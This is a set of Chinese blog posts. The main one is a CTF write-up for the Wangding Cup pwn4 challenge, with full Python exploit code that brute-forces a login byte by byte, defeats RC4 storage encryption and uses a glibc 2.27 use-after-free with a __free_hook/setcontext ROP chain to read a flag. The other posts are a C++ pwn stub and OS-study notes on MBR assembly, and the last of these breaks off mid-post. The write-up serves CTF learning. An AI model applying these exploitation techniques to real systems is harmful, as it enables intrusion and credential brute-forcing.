[{"title":"网鼎杯pwn4复现","url":"/2024/10/31/%E7%BD%91%E9%BC%8E%E6%9D%AFpwn4%E5%A4%8D%E7%8E%B0/","content":"网鼎杯pwn4\n下载附件\n\n​\t中午发的题，一看数据库心想没学过去看那道webpwn，没学过，rust，没学过。事已至此，先吃饭吧。\n​\t吃完饭后还是看了一眼附件，花了20分钟分析觉得能打，密码爆破+加密+堆orw，想到了之前打过的silverwolf，就是打tcache_struct+setcontext来绕过堆orw。最后还是卡在加密，找gpt要了两次脚本都没过，现在来看实在是gpt差距。最后争不动去上数电课了，整场比赛就出了一道300分的pwn签到，最战犯的一集\n爆破账号密码​\t\n​\t看到用户名检测后续想到爆破，第一步和绕过strncmp的原理相同，他只会比较你输入的字符串长度范围内的两个字符串有没有差异，所以我们可以逐字节爆破。但是之后他还是会检查两个字符串长度，所以我们需要爆破完整的账号。\n​\t一般账号密码只会使用键盘上有的字符，可以预先准备一个爆破字典，我的方法是直接爆破ascii 33-126范围的字符。可以直接用man命令查看ascii码对应的字符\nmain ascii\n\n爆破脚本：\nfor i in range(10):    for i in range(33, 127):        success(&quot;try----&gt;&quot;+chr(i))        p.sendafter(&quot;Input your username:&quot;,username+chr(i)+&#x27;\\0&#x27;+&#x27;\\n&#x27;)        p.recvline()        recv = p.recvline()        if b&quot;Invalid username!&quot; in recv and b&quot;Invalid username length!&quot; not in recv:            continue        else:            success(&quot;find----&gt;&quot;+chr(i))            username += chr(i)            success(&quot;username----&gt;&quot;+username)            break    if b&quot;Username correct!&quot; in recv:        break\n\n对于密码的爆破也同理\np.sendlineafter(&quot;Input your username:&quot;,username)for i in range(10):    for j in range(33, 127):        p.sendlineafter(b&#x27;Input your password:\\n&#x27;, passwd+chr(j))        recv = p.recvline()        if b&#x27;Invalid password!&#x27; in recv:            p.sendlineafter(&quot;Input your username:&quot;,username)            continue        elif b&#x27;Invalid password length!&#x27; in recv:            success(&quot;find----&gt;&quot;+chr(j))            passwd += chr(j)            success(&quot;passwd----&gt;&quot;+passwd)            p.sendlineafter(&quot;Input your username:&quot;,username)            break    if b&quot;Password correct!&quot; in recv:        break&#x27;&#x27;&#x27;\n\n这个程序如果账号密码不正确会直接退出，还会贴心的回到输入账号密码的入口，所以我们不必每次都p.remote()和p.close()。但是每次爆破密码不成功都要重新输入一次账户。\n最后爆破出来用户名是”4dmin”，密码是”985da4f8cb37zkj”。\n在本地调试的时候记得自己添加一个password和username文件测试爆破脚本是否有效。\n存储内容加密\n​\t之后就是经典的增删改查，在释放堆块时有uaf漏洞。但是他在每次存入和修改数据时都会先把数据输入，再对数据长度的内容加密，每次查看数据时再把数据取出来解密，显示数据内容再加密放回去\n​\t\n\n\n​\t加密的过程看了一遍之后不能说是完全看懂，至少也是一窍不通。不仅是泄露释放堆块后的main_arena偏移还是堆地址，还是填入伪造地址都要绕过加密。\n​\t但是从最后的异或和解密来看可能加密和解密过程都是相同的，一开始我想能否通过重复填入加密后的内容得到加密前的内容，不用写解密脚本了？程序遵守填入&#x2F;更改就加密，取回解密展示再加密放回，所以除了写解密脚本没有别的办法泄露内容。\n​\t只好把代码扔给了ai生成如下解密脚本（没有ai的世界是多么寸步难行……或许是我太捞了\ndef sub_1152(state_array, output, length):    v5 = 0    v6 = 0    for i in range(length):        v5 = (v5 + 1) % 256        v6 = (v6 + state_array[v5]) % 256                # Swap in state array        state_array[v5], state_array[v6] = state_array[v6], state_array[v5]                # Encrypt the data        output[i] ^= state_array[(state_array[v5] + state_array[v6]) % 256]def encrypt(plaintext):    key = b&#x27;s4cur1ty_p4ssw0rd&#x27;    state_array = bytearray(256)    # Initialize the state array using sub_F98    sub_F98(state_array)        # Prepare output buffer    output_data = bytearray(plaintext)        # Encrypt using sub_1152    sub_1152(state_array, output_data, len(plaintext))        return bytes(output_data)def decrypt(encrypted_data):    key = b&#x27;s4cur1ty_p4ssw0rd&#x27;    state_array = bytearray(256)    # Initialize the state array using sub_F98    sub_F98(state_array)        # Prepare output buffer    decrypted_data = bytearray(encrypted_data)        # Decrypt using sub_1152    sub_1152(state_array, decrypted_data, len(encrypted_data))        return bytes(decrypted_data)\n\n但是我的解密脚本似乎有问题，当输入比较长时，就会发生这种情况：\n\n后半段完全变成乱码了:-( 比赛的时候急得我上蹿下跳，完全忘了队里的re手\nhttps://blog.csdn.net/Mr_Fmnwon/article/details/143355594\n事后复现嫖走了这位师傅的解密函数: -)  \n\n好耶。\n原来事rc4加密。这rc4加密真rc4啊。\n泄露堆地址与libc地址​\tglibc版本2.27，引入了tcache还没有其他什么检测，甚至可以通过直接覆盖fd的方式请出任意已知位置的堆块，几乎是板子题。但程序沙箱禁用了exeve和exeveat\n\n对于这个版本的堆orw，我想到了之前做过的ciscn2021 silverwolf，同样也是打tcache利用setcontext，但是那个题申请堆块大小有限，所以必须通过控制tcache_struct拼接两个堆块来填入足够长度的orw链。比赛的时候我局限了，照着silverwolf的脚本就是一顿复制粘贴，但实际上这个题对于堆块大小没有限制，完全可以不用打tcache_struct。\n在通过账号密码之后用pwndbg看一眼堆会发现乱得一，这是因为沙箱的原因\n\n我们首先通过tcache泄露堆地址，通过uaf泄露地址时内存中的确是原地址，但程序执行时先会取出解密再展示，所以我们还是要把取出来的数据走一遍解密\nadd(0, 0x70, b&#x27;aaaa&#x27;)delete(0)show(0)p.recvuntil(b&#x27;[0,&#x27;)encry1 = p.recv(8)success(&quot;encry1----&gt;&quot;+hex(u64(encry1)))heap = rc4((encry1))success(&quot;heap----&gt;&quot;+hex(u64(heap)))heap_base = u64(heap)+0x55b4ebaab000-0x55b4ebaabc70success(&quot;heap_base----&gt;&quot;+hex(heap_base))\n\n然后我们需要填满tcache，再释放一个相同大小的堆块放入unsortedbin泄露libc基址。这个堆块需要大于0x70，不然会放入fastbin，同时为了防止沙箱残留的堆块造成影响，所以我选择了0x150大小的堆块。\nfor i in range(9):    add(i, 0x240, b&#x27;a&#x27;)for i in range(8):    delete(i)show(7)p.recvuntil(b&#x27;[7,&#x27;)encry2 = p.recv(8)main_arena = u64(rc4(encry2)) -0x96success(&quot;main_arena----&gt;&quot;+hex(main_arena))libc_base = main_arena+ 0x7f14b1604000 - 0x7f14b19efc0asuccess(&quot;libc_base----&gt;&quot;+hex(libc_base))\n\nsetcontext &amp; orw\n如图是附件给的动态链接库里setcontext函数的样子，在setcontext+53的位置开始可以通过rdi的偏移设置各个寄存器，而在free一个堆块时会将rdi指向该堆块的位置。先把预备free的堆块上设置setcontext的frame，其中rsp设置为free_hook+8，然后把（setcontext+53）+（orw）写到free_hook上，这样就可以直接返回到orw\n&#x27;&#x27;&#x27;frame = SigreturnFrame()frame.rdi = free_hook+0x100frame.rsi = 0frame.rdx = 0frame.rsp = free_hook+0x8frame.rip = libc_base+libc.sym[&#x27;open&#x27;]&#x27;&#x27;&#x27;frame = b&#x27;&#x27;frame = frame.ljust(0x68, b&#x27;\\x00&#x27;)+p64(free_hook+0x108)+p64(0) #rdi rsiframe = frame.ljust(0x88, b&#x27;\\x00&#x27;)+p64(0) #rdxframe = frame.ljust(0xa0, b&#x27;\\x00&#x27;)+p64(free_hook+8)+p64(libc_base+libc.sym[&#x27;open&#x27;])#rsp rcxadd(0, 0x160, bytes(frame))rdi = libc_base + 0x2164frsi = libc_base + 0x23a6ardx = libc_base + 0x1b96setcontext = libc_base+libc.sym[&#x27;setcontext&#x27;]payload_orw = p64(rdi)+p64(3)+p64(rsi)+p64(heap_base+0x1100)+p64(rdx)+p64(0x100)+p64(libc_base+libc.sym[&#x27;read&#x27;])payload_orw += p64(rdi)+p64(1)+p64(libc_base+libc.sym[&#x27;write&#x27;])payload_orw = payload_orw.ljust(0x100, b&#x27;\\x00&#x27;)+b&#x27;/flag\\x00&#x27;edit(6, rc4(p64(free_hook)))add(7, 0x150, b&#x27;a&#x27;)add(7, 0x150, rc4(p64(setcontext+53)+payload_orw))gdb.attach(p)delete(0)p.interactive()\n\n我不直接用SigretureFrame()的原因是本地调试时会出错，所以人工对着偏移设置的各个寄存器:-(。记得在exp脚本开头设置面向操作系统和架构\ncontext(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)\n\n记得预备free的堆块，就是设置setcontext上下文的那个堆块要申请的大一点(&gt;0xa0)，不然会导致后面寄存器写不上去的情况，同时也可以方便一点之后的orw，提前把open的寄存器设置好，当然求稳也可以写到orw里。\n总expfrom pwn import *from LibcSearcher3 import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)filename = &#x27;pwn&#x27;def exec_fmt(pad):    p = process(&#x27;./&#x27;+filename)    p.sendlineafter(&quot;Enter your name: &quot;, pad)    p.recvuntil(b&#x27;Hello, &#x27;)    return p.recv()&#x27;&#x27;&#x27;fmt = FmtStr(exec_fmt)print(&quot;offset ===&gt; &quot;, fmt.offset)&#x27;&#x27;&#x27;IP = &#x27;&#x27;debug = 0if debug:    p = remote(&#x27;0192d6893cc27e60b227aa9ef34bad8f.t1dx.dg03.ciihw.cn&#x27;, 44732)else:    p = process(&#x27;./&#x27;+filename)elf = ELF(&#x27;./&#x27;+filename)def dbg():    gdb.attach(p)ubuntu16 = [&#x27;~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;, &#x27;~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;]ubuntu18 = [&#x27;~/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;, &#x27;~/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&#x27;]libc = ELF(&#x27;/home/marcel/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&#x27;)def leak(something):    rc = u64(p.recv(6).ljust(8,b&quot;\\x00&quot;))    success(something+&quot;----&gt;&quot;+hex(rc))    return rcdef leak_fmt(something):    rc = int(p.recv(14),16)    success(something+&quot;----&gt;&quot;+hex(rc))    return rcdef add(idx, size, content):    p.sendlineafter(&quot;&gt; \\n&quot;, &#x27;1&#x27;)    p.sendlineafter(&quot;Input the key: &quot;, str(idx))    p.sendlineafter(&quot;Input the value size: &quot;, str(size-1))    p.sendlineafter(&quot;Input the value: &quot;, content)def show(idx):    p.sendlineafter(&quot;&gt; \\n&quot;, &#x27;2&#x27;)    p.sendlineafter(&quot;Input the key: &quot;, str(idx))def delete(idx):    p.sendlineafter(&quot;&gt; \\n&quot;, &#x27;3&#x27;)    p.sendlineafter(&quot;Input the key: &quot;, str(idx))def edit(idx, content):    p.sendlineafter(&quot;&gt; \\n&quot;, &#x27;4&#x27;)    p.sendlineafter(&quot;Input the key: &quot;, str(idx))    p.sendlineafter(&quot;Input the value: &quot;, content)def ksa(dest, password, length):    # 初始化 S-box    S_box = list(range(256))    password_1 = [0] * 256        # 根据密钥生成 password_1    for i in range(256):        password_1[i] = ord(password[i % length])        # 执行密钥调度算法    j = 0    for i in range(256):        j = (j + S_box[i] + password_1[i]) % 256        S_box[i], S_box[j] = S_box[j], S_box[i]        return S_boxdef prga(S_box, data, length):    i = 0    j = 0        for k in range(length):        i = (i + 1) % 256        j = (j + S_box[i]) % 256                # 交换 S-box 中的元素        S_box[i], S_box[j] = S_box[j], S_box[i]                # 生成密钥流字节并与数据异或        key_stream_byte = S_box[(S_box[i] + S_box[j]) % 256]        data[k] ^= key_stream_byte        return datadef rc4(data):    password = &#x27;s4cur1ty_p4ssw0rd&#x27;    # 转换 data 为 bytearray    data = bytearray(data.encode() if isinstance(data, str) else data)        # 获取数据长度    length = len(data)        # 初始化 S-box    S_box = ksa(None, password, len(password))        # 加密/解密数据    prga(S_box, data, length)        return bytes(data)username = &#x27;4dm1n&#x27;passwd = &#x27;985da4f8cb37zkj&#x27;p.sendlineafter(&quot;Input your username:&quot;, username)p.sendlineafter(&quot;Input your password:&quot;, passwd)add(0, 0x70, b&#x27;aaaa&#x27;)delete(0)show(0)p.recvuntil(b&#x27;[0,&#x27;)encry1 = p.recv(8)success(&quot;encry1----&gt;&quot;+hex(u64(encry1)))heap = rc4((encry1))success(&quot;heap----&gt;&quot;+hex(u64(heap)))heap_base = u64(heap)+0x55b4ebaab000-0x55b4ebaabc70success(&quot;heap_base----&gt;&quot;+hex(heap_base))for i in range(9):    add(i, 0x150, b&#x27;a&#x27;)#tcache*7+unsorted*1+seperate*1for i in range(8):    delete(i)show(7)p.recvuntil(b&#x27;[7,&#x27;)encry2 = p.recv(8)main_arena = u64(rc4(encry2)) -0x96success(&quot;main_arena----&gt;&quot;+hex(main_arena))libc_base = main_arena+ 0x7f14b1604000 - 0x7f14b19efc0asuccess(&quot;libc_base----&gt;&quot;+hex(libc_base))free_hook = libc_base+libc.sym[&#x27;__free_hook&#x27;]&#x27;&#x27;&#x27;frame = SigreturnFrame()frame.rdi = free_hook+0x100frame.rsi = 0frame.rdx = 0frame.rsp = free_hook+0x8frame.rip = libc_base+libc.sym[&#x27;open&#x27;]&#x27;&#x27;&#x27;frame = b&#x27;&#x27;frame = frame.ljust(0x68, b&#x27;\\x00&#x27;)+p64(free_hook+0x108)+p64(0) #rdi rsiframe = frame.ljust(0x88, b&#x27;\\x00&#x27;)+p64(0) #rdxframe = frame.ljust(0xa0, b&#x27;\\x00&#x27;)+p64(free_hook+8)+p64(libc_base+libc.sym[&#x27;open&#x27;])#rsp rcxadd(0, 0x160, bytes(frame))rdi = libc_base + 0x2164frsi = libc_base + 0x23a6ardx = libc_base + 0x1b96setcontext = libc_base+libc.sym[&#x27;setcontext&#x27;]payload_orw = p64(rdi)+p64(3)+p64(rsi)+p64(heap_base+0x1100)+p64(rdx)+p64(0x100)+p64(libc_base+libc.sym[&#x27;read&#x27;])payload_orw += p64(rdi)+p64(1)+p64(libc_base+libc.sym[&#x27;write&#x27;])payload_orw = payload_orw.ljust(0x100, b&#x27;\\x00&#x27;)+b&#x27;/flag\\x00&#x27;edit(6, rc4(p64(free_hook)))add(7, 0x150, b&#x27;a&#x27;)add(7, 0x150, rc4(p64(setcontext+53)+payload_orw))gdb.attach(p)delete(0)p.interactive()\n\nReferhttps://blog.csdn.net/Mr_Fmnwon/article/details/143355594\n","categories":["pwn","heap","setcontext"],"tags":["pwn","blasting","heap","setcontext"]},{"title":"c艹pwn学习","url":"/2024/11/01/c%E8%89%B9pwn%E5%AD%A6%E4%B9%A0/","content":"C++pwn学习​\t不能再碌碌无为了！对于c++pwn真是一窍不通……比赛也只有保龄的份，在这里逐步更新c++pwn的学习。\nReferdig into C++ pwn - Hexo\n","categories":["pwn","c++"],"tags":["pwn","c++","to_do_list"]},{"title":"操作系统啥啥啥的","url":"/2024/11/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%95%A5%E5%95%A5%E5%95%A5%E7%9A%84/","content":"操作系统咕咕咕咕南大的jyy操作系统课&amp;操作系统真相还原:-)，9月份开始念拖到现在，抽出空闲时间尽量做吧。\nBIOS &amp; 中断实现MBRBIOS是计算机上第一个运行的软件，由只读存储器ROM加载。程序通电后cs:ip寄存器强制初始化为0xf000:0xfff0，就是地址0xffff0，这段代码会跳转到0xfeb50处，就是BIOS代码真正开始的地方。BIOS会检查外设信息、初始化硬件、引导加载程序。它的最后一项工作就是校验启动盘里0盘0道1扇区的内容，就是去找主引导记录MBR，确认上去末尾两个字节分别是0x55和0xaa后就表明该扇区是可加载的程序。\nMBR用来引导操作系统，在被确认可引导后会被加载到物理地址0x7c00的位置（为什么是这个位置是个历史遗留问题），然后BIOS跳转到这个位置。mbr是干嘛的？\n\n然后书上给了个实例汇编代码……用来实现mbr……这应该不是传统意义上的mbr，毕竟他的作用就是清屏、定位光标、打印一行字符串，但是模拟了BIOS启动到加载mbr、运行mbr的过程\nsection MBR vstart=0x7c00    mov ax, cs    mov ds, ax    mov es, ax    mov ss, ax    mov fs, ax ;cs为0，为各个寄存器中转赋值    mov sp, 0x7c00    mov ax, 0x600 ;ah功能号=6，向上或向下滚动行，即为清屏，al=0即为全部行    mov bx, 0x700 ;    mov cx, 0x0 ;    mov dx, 0x184f ; 上面三个是参数    int 0x10 ;显示和视频中断    mov ah, 3 ; 获取光标位置    mov bh, 0 ; 在第一页获取    int 0x10    mov ax, message    mov bp, ax ;bp是段偏移寄存器，无法mov直接数，所以用ax暂存字符串地址        mov cx, 16 ;串长度    mov ax, 0x1301 ;ah=13，显示字符及属性，al=1，显示字符串，光标跟随移动    mov bx, 0x2 ; bh=0，显示页，bl=2，黑底绿字    int 0x10    jmp $ ;$代表当前地址，即无限循环    message: db &#x27;Hello, OS world!&#x27;    times 510-($-$$) db 0 ;填充0，使程序长度为512字节，-($-$$)表示当前地址减去该section的起始地址    db 0x55, 0xaa ;最后两个字节为可加载标志，0x55, 0xaa，一共512字节\n\n注意的点不能把直接数赋给cs:ip寄存器，可以通过其他寄存器暂存的方法间接赋予。不然就会这样：\nmbr.S:22: error: invalid combination of opcode and operands\n\nax寄存器高8位ah用来作为调用功能号存储，低8位al用来传递数据或参数\nmov ax, 0x600 ;ah功能号=6，向上或向下滚动行，即为清屏，al=0即为全部行\n\n$代表当前指令地址，$$代表当前section起始地址，两个相减就是本扇区已用空间\ntimes 510-($-$$) db 0 ;填充0，使程序长度为512字节，-($-$$)表示当前地址减去该section的起始地址\n\n通过nasm编译出二进制文件\nnasm -o mbr.bin mbr.S\n\n放ida里看一眼，嘿嘿\n\n在偏移0x21的地方是汇编指令“mov     ax, 7C33h”，对应源码中的“mov ax, message”，而起始虚拟地址为0x7c00的条件下message的偏移确为0x7c33，所以程序确是以0x7c00为起始编址\n不能直接.&#x2F;mbr.bin运行（蠢比），需要BIOS引导\n\n这么来看必须要在我的wsl上搞一个虚拟环境了。。。\n————————————————————————————————————————————————————————————\n然后过了艰难的一段调bochs环境，最终我原封不动的下了和书上相同的bochs版本，原封不动的把配置流程走了一遍，但是并没有“没有启动盘”的报错，有点心虚。。。\n首先创建一个虚拟硬盘作为我们的启动盘：\nbin/bximage -hd -mode=&quot;flat&quot; -size=60 -q hd60M.img\n\n然后使用磁盘操作命令dd将我们的二进制文件mbr.bin数据输入到这个虚拟硬盘里：\ndd if=/home/marcel/OS/mbr.bin of=/home/marcel/OS/bochs/hd60M.img bs=512 count=1 conv=notrunc\n\n​\t启动bochs，6，回车，c（和gdb一样的命令）启动\n\n打印出来了一行绿色的字，从初始的回显可以看出起始地址在0xffff0，然后跳转到0xfe05b的位置，就是BIOS的起始地址，然后BIOS巴拉巴拉……最终检测到0盘0道1扇区末尾有魔数0x55aa，直接跳转到0x7c00的位置，执行了我们自己写的mbr。\n再小小改进一下……\nsection MBR vstart=0x7c00    mov ax, cs    mov ds, ax    mov es, ax    mov ss, ax    mov fs, ax    mov sp, 0x7c00 ;设置段寄存器    mov ax, 0x600 ;ah功能号=6，向上或向下滚动行，al=0即为全部行，即为清屏    mov bx, 0x700 ;    mov cx, 0x0 ;    mov dx, 0x184f ; 上面三个是参数    int 0x10 ;显示和视频中断    mov ah, 3 ; 获取光标位置    mov bh, 0 ; 在第一页获取    int 0x10    mov ax, message    mov bp, ax ;bp是段偏移寄存器，无法mov直接数，所以用ax暂存字符串地址        mov cx, 8 ;循环8次    mov ax, 0x1301 ;ah=13，显示字符及属性，al=1，显示字符串，光标跟随移动    mov bx, 0x0 ; bh=0，显示页    mov dl, 0 ;从0列开始    mov dh, 0 ;从0行开始puts_8:    push cx ;保存cx    mov cx, 0x10 ;每次打印16字符    int 0x10    inc bl ;每次循环属性+1，打印出彩色    inc dh ;行+1    pop cx    loop puts_8    jmp $ ;$代表当前地址，即无限循环    message: db &#x27;Hello, OS world!&#x27;    times 510-($-$$) db 0 ;填充0，使程序长度为512字节，-($-$$)表示当前地址减去该section的起始地址    db 0x55, 0xaa ;最后两个字节为可加载标志，0x55, 0xaa，一共512字节\n\n\nHello, OS world!\n始于足下。\nmbr硬件♂交互一点点汇编&amp;硬件补充然后的第三章作者用两小节补充了汇编相关的内容。之前有一点点pwn基础，少说也读过（心虚）csapp，所以像看小说一样很轻松的就看完了，包括实模式、地址分段、指令执行、寄存器、栈与相关操作、寻址方式与jmp、call的调用方式、flags寄存器这些内容。巩固了一些知识，也的确有额外的收获：\n在ida反汇编的时候，常常能看到这样的语句：\n\n在之前我只是直接理解为他会无条件跳转到0x187a这个位置，short是什么？\n相似的还有这样：\njmp\t\tnear loc_15E3\n\nnear和short都是表明，在汇编成机器语言时这里是相对跳转而不是直接跳转，比如上面那个jmp short 187a在机器码中就是“EB 27”，eb表示相对近转移，27就是操作数，实际上等于 当前位置与0x187a之差-当前指令长度，near也是同理，他们在机器码中都是基于当前位置（在与目标位置同段，或者说相对比较近的情况下）进行相对跳转，你看机器码中的操作数并没有出现7a18，都不是直接跳转。\n书中将几种跳转方式分为相对短转移、相对近转移、间接绝对近转移、直接绝对远转移、间接绝对远转移，相对与绝对表示目标是与当前位置的偏移还是实际地址，直接间接表示目标数是直接数还是寄存器&#x2F;内存引用。\n这些东西知道了就是知道了，和之前不知道好像没区别。实际上有什么用呢？\n想起了之前暑假的时候考研学长和我说的话，的确如此……\n为了解决cpu与各个硬件之间的不协调，就有了IO接口这一中间层，帮助cpu处理硬件，就像收作业的小组长。书中说到看不到声卡和显卡是因为他们集成在主板里面了，就是集成声卡集成显卡。那时候还是2013年，ai和3A游戏在我们眼里还是很遥远的词汇，想来真是感慨。书中说03年时作者看过一个特大的显卡，就像主板插在显卡上一样，这是不是当年的独显呢？\n硬件那些不多说了，看过就是看过。这个学期我甚至没报上数电实验（悲\n显存MBR之前的实践都是通过中断让BIOS给我们打印字符，而且中断向量表只存在于实模式中，那么如何不通过中断打印呢？\n我们直接对显存下手。\n显存文本模式下内存地址为0xb8000，我们往上面写东西就会落到显存中，显存上有了数据就会往屏幕上面打印，某种意义上来说我们就可以不通过中断调用BIOS打印字符了\nSECTION MBR vstart=0x7c00    mov ax, cs    mov ds, ax    mov es, ax    mov ss, ax    mov fs, ax    mov sp, 0x7c00    mov ax, 0xb800     mov gs, ax ;设置gs为段寄存器，位置为0xb8000，即为显存文本模式的内存地址    mov ax, 0x600 ;ah功能号=6，向上或向下滚动行，al=0即为全部行，即为清屏    mov bx, 0x700 ;    mov cx, 0x0 ;    mov dx, 0x184f ; 上面三个是参数    int 0x10 ;显示和视频中断    mov byte [gs:0x00], &#x27;H&#x27;     mov byte [gs:0x01], 0xa4    mov byte [gs:0x02], &#x27;e&#x27;    mov byte [gs:0x03], 0xa4    mov byte [gs:0x04], &#x27;l&#x27;    mov byte [gs:0x05], 0xa4    mov byte [gs:0x06], &#x27;l&#x27;    mov byte [gs:0x07], 0xa4        mov byte [gs:0x08], &#x27;o&#x27;    mov byte [gs:0x09], 0xa4    mov byte [gs:0x0a], &#x27; &#x27;    mov byte [gs:0x0b], 0xa4        mov byte [gs:0x0c], &#x27;O&#x27;    mov byte [gs:0x0d], 0xa4    mov byte [gs:0x0e], &#x27;S&#x27;    mov byte [gs:0x0f], 0xa4 ;每个打印的字符占2个字节大小，低字节是字符ascii码，高字节是颜色和显示模式。0xa4代表绿色背景闪烁，前景色为红色(RGB)    jmp $    times 510-($-$$) db 0 ;填充0，使程序长度为512字节，-($-$$)表示当前地址减去该section的起始地址    db 0x55, 0xaa ;最后两个字节为可加载标志，0x55, 0xaa，一共512字节\n\n与中断实现相比，这一版的代码改变了两处：一处是我们把gs定为显存的段寄存器，把它设为0xb800，实际上[gs:0xab]就是0xb80ab；另一处把通过中断打印的内容改成往显存文本模式内存中写字符显示的数据，就是通过gs寄存器做段寄存器寻址实现的\n然后重新编译，写入虚拟硬盘，启动bochs，看看效果如何：\n\n左上角有一个很小的“hello OS”\n实际上它在不断闪烁。\nmbr之can can need 硬盘到现在好像都没做什么实事，但是大的药来了——用mbr读取硬盘内容。\n这里说的硬盘是机械硬盘，就是那个有盘子，用磁头读写的硬盘。\n【【硬核科普】固态硬盘为什么比机械硬盘快？快在哪里？快的这些地方影响什么体验？】https://www.bilibili.com/video/BV1dE411k7tU?vd_source=1f48e47dc1ff12763001a0341edf7ebd\n如果你不知道什么是机械硬盘，什么是固态硬盘，这个科普视频讲的非常好。2024的今天机械硬盘已经被淘汰，你我的电脑里大多装的都是固态硬盘，如果上网搜索“双十一硬盘选购”，那么结果也是固态硬盘占绝大多数。会装机的室友向我展示了他的固态与机械硬盘，固态就是小小的食指大小一条，机械硬盘有我手掌大。\n”固态比机械快？“\n”机械完全不能用。“\n这本书还是2013年成书，让人不得不感慨时代的变迁，仅仅过去了十年。\n之前我们模拟的hd60M.img就是虚拟机械硬盘。\n只不过还是很有意思的，不通过中断的方式直接和硬件交互的就像不断探索底层，从c到汇编到机械码，从函数调用到中断到硬件交互，就像剥洋葱，如果你愿意一层一层一层一层……\n之前提到过硬件与cpu交互需要媒介，就是所谓的IO接口。硬盘的IO接口就是硬盘控制器，我们读写硬盘就是读写硬盘控制器的端口，而IO接口上的端口就是他的寄存器，换句话说我们读写硬盘、查看硬盘的状态之类的就是和硬盘控制器上的寄存器打交道。\n有很多的硬盘端口……但是我们只用其中的一部分：\n\n端口作用在读写时不同，同一个端口在读和写时可能有不同的作用。不用在意通道啥的，就是主盘接口和从盘接口，接下来都一样的\ndata寄存器就是管理数据的，可出也可进，既然是闸门必须大，只他一个可以存两个字节大小，其他全是8位寄存器。写硬盘时数据源源不断的送到此端口，硬盘控制器发现里面有内容了就往扇区上写，读硬盘时就是不断读这个寄存器\nerror读时记录失败信息，写时存储额外参数\nsector count存储待读写的扇区数量\n接下来三个端口（也是寄存器）用来存储读取或写入的目标硬盘地址。当然可以通过柱面-磁头-扇区的方式来存储硬盘地址，这种存储方式叫做CHS，但是这样mbr又会说看不懂思密达，那就直接简单粗暴的把每个扇区12345地编号，这样就称作LBA。这里的LBA用28位存储一个扇区的地址，low mid high分别对应地址中的低位中位高位，3*8&#x3D;24不是我还有4位呢？\ndevice出场，他的作用比较杂，首先作为一个8位寄存器它的低4位补齐LBA存储的最后一部分，其次第4位用来表示主盘（0）还是从盘（1），第6位表示LBA模式还是CHS模式，5位和7位都置0\nstatus寄存器保存各种状态，第0位是ERR位，它是1就去找error寄存器，第3位表示数据是否准备好，第6位表示硬盘是否就绪，第7位表示硬盘是否繁忙。\n\ncommand寄存器可以识别很多指令，这是其中三个：\n\n0xec，硬盘识别\n0x20，读硬盘\n0x30，写硬盘\n\n接下来……我们只用到这三个\n实际上为了方便cpu直接从内存中拿数据其他什么都不用管，已经有了MBA（直接存储器）这种东西，甚至还有更牛逼的IO处理器，但是他们都是单独的硬件，我们的目的是手搓模拟。那就上吧！\n%include &quot;boot.inc&quot;   ; 预处理命令，类似与c语言的头文件，给了如下两个宏; LOADER_BASE_ADDR equ 0x900 ; LOADER_START_SECTOR equ 0x2SECTION MBR vstart=0x7c00    mov ax, cs    mov ds, ax    mov es, ax    mov ss, ax    mov fs, ax    mov sp, 0x7c00 ;设置段寄存器    mov ax, 0xb800    mov gs, ax ; gs等下我们薅过来做段寄存器，这里先把它初始化    mov ax, 0x600 ;ah功能号=6，向上或向下滚动行，al=0即为全部行，即为清屏    mov bx, 0x700 ;    mov cx, 0x0 ;    mov dx, 0x184f ; 上面三个是参数    int 0x10 ;显示和视频中断    mov byte [gs:0x00], &#x27;H&#x27;    mov byte [gs:0x01], 0xa4    mov byte [gs:0x02], &#x27;e&#x27;    mov byte [gs:0x03], 0xa4    mov byte [gs:0x04], &#x27;l&#x27;    mov byte [gs:0x05], 0xa4    mov byte [gs:0x06], &#x27;l&#x27;    mov byte [gs:0x07], 0xa4    mov byte [gs:0x08], &#x27;o&#x27;    mov byte [gs:0x09], 0xa4    mov byte [gs:0x0a], &#x27; &#x27;    mov byte [gs:0x0b], 0xa4        mov byte [gs:0x0c], &#x27;O&#x27;    mov byte [gs:0x0d], 0xa4    mov byte [gs:0x0e], &#x27;S&#x27;    mov byte [gs:0x0f], 0xa4    mov eax, LOADER_START_SECTOR ;扇区起始地址，就是第二扇区    mov bx, LOADER_BASE_ADDR ;写入地址    mov cx, 1 ;待读入扇区数    call rd_disk_m_16 ;读取16位硬盘    jmp LOADER_BASE_ADDR ;完成读取后跳转到; 读取硬盘第n个扇区rd_disk_m_16:    mov esi, eax    mov di, cx ;备份寄存器，从此di就是待读入扇区数; 设置读取扇区数    mov dx, 0x1f2    mov al, cl    out dx, al ;将待读入扇区数写入0x1f2寄存器，即为sector count    mov eax, esi ;恢复ax,即为扇区起始地址;存入LBA地址    mov dx, 0x1f3 ;lowLBA    out dx, al    mov cl, 8    shr eax, cl ;右移，取中位LBA    mov dx, 0x1f4 ;midLBA    out dx, al    shr eax, cl    mov dx, 0x1f5 ;highLBA    out dx, al    shr eax, cl    and al, 0x0f ;取最后四位    or al, 0xe0 ;设置LBA模式1110    mov dx, 0x1f6 ;device    out dx, al    mov dx, 0x1f7 ;command    mov al, 0x20 ;读指令    out dx, al;检测硬盘状态.not_ready:    nop ;等待一下，相当于sleep()    in al, dx ;切换为读状态，dx变为status寄存器，读入状态数据    and al, 0x88 ;取硬盘控制器是否准备好和是否繁忙的两位    cmp al, 0x08    jnz .not_ready ;两位有一位不和要求就跳回重新判断;从0x1f0端口读数据    mov ax, di ;之后mul命令会将ax作为乘数，用来计算读取数据的次数，这里保存的是待读扇区数    mov dx, 256 ;一次读2字节，一个扇区512字节，每个扇区读256次    mul dx ;1*256=256，这个数据就是读取次数，会被保存到ax中    mov cx, ax ;将读取次数存入计数寄存器cx;开读!    mov dx, 0x1f0.go_on_read:    in ax, dx     mov [bx], ax ;将读入的字存到写入地址0x900中    add bx, 2 ;一次读两字节，写入地址加2    loop .go_on_read ;循环，每次cx减1，直到等于0    rettimes 510-($-$$) db 0db 0x55, 